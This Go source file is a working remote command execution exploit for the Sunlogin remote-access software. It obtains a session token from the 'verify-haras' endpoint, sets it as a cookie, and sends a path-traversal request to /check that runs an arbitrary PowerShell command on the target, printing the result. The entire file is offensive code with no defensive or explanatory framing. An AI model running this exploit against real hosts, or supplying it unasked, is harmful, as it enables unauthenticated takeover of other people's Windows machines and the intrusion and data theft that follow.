package sunlogin

import (
	"crypto/tls"
	"fmt"
	"github.com/go-resty/resty/v2"
	"github.com/tidwall/gjson"
	"log"
	"strings"
	"time"
)

func Exploit(ip string, port string, cmd string) {
	base_url := fmt.Sprintf("http://%s:%s", ip, port)
	client := resty.New().SetTimeout(3 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
	if isExists(base_url, client) {
		fmt.Println("Vuln may Exists,Vuln Port is " + port)
		fmt.Println("Try to confirm")
		verify_code := getVerifyCode(base_url, client)
		if verify_code != nil {
			fmt.Printf("get verify code:%s\n", *verify_code)
			fmt.Println("try next step")
			result := getCommandRunResult(base_url, cmd, *verify_code, client)
			if result != nil {
				fmt.Printf("Vuln confirm Exists,run command \"%s\" success\nresult:%s\n", cmd, *result)
			} else {
				log.Fatal("Vuln Failed")
			}
		} else {
			log.Fatal("Vuln Failed")
		}
	} else {
		fmt.Println("Vuln Not Exists")
	}
}
func isExists(baseUrl string, client *resty.Client) bool {
	resp, err := client.R().EnableTrace().Get(baseUrl)
	if err != nil {
		return false
	}
	if strings.Contains(string(resp.Body()), "Verification") {
		return true
	} else {
		return false
	}
}
func getVerifyCode(baseUrl string, client *resty.Client) *string {
	resp, err := client.R().EnableTrace().Get(baseUrl + "/cgi-bin/rpc?action=verify-haras")
	if err != nil {
		return nil
	}
	verify_code := gjson.Get(string(resp.Body()), "verify_string")
	if verify_code.Str != "" {
		return &verify_code.Str
	}
	return nil
}
func getCommandRunResult(baseUrl string, cmd string, verifyCode string, client *resty.Client) *string {
	client.Header.Set("Cookie", "CID="+verifyCode)
	resp, err := client.R().EnableTrace().Get(baseUrl + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+" + cmd)
	if err != nil {
		return nil
	}
	result := string(resp.Body())
	if result != "" {
		return &result
	}
	return nil
}
